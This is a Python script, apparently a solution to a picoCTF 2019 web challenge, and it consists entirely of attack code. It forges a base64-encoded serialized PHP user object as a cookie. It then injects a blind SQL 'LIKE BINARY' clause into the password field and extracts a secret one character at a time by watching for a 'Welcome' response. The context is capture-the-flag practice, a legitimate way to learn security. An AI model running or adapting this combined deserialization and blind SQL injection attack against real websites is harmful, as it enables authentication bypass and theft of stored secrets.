import requests
import string
import base64

def send_req(password):
    print("trying {}".format(password))
    payload = ('O:8:"siteuser":2:{{s:8:"username";s:5:"admin";s:8:"password";s:{}:"{}";}}'.format(len(password), password)).encode('utf-8')
    cookies = dict(user_info=base64.b64encode(payload).decode('utf-8'))
    r = requests.get("http://2019shell1.picoctf.com:62195/index.php?file=admin", cookies=cookies)
    if "Welcome" in r.text:
        return True
    else:
        return False

alpha = string.digits + string.ascii_letters + '{}'

flag = ""
while True:
    for c in alpha:
        if send_req("' or password like BINARY '" + flag + c + "%"):
            flag += c
            print(flag)
            break
    else:
        break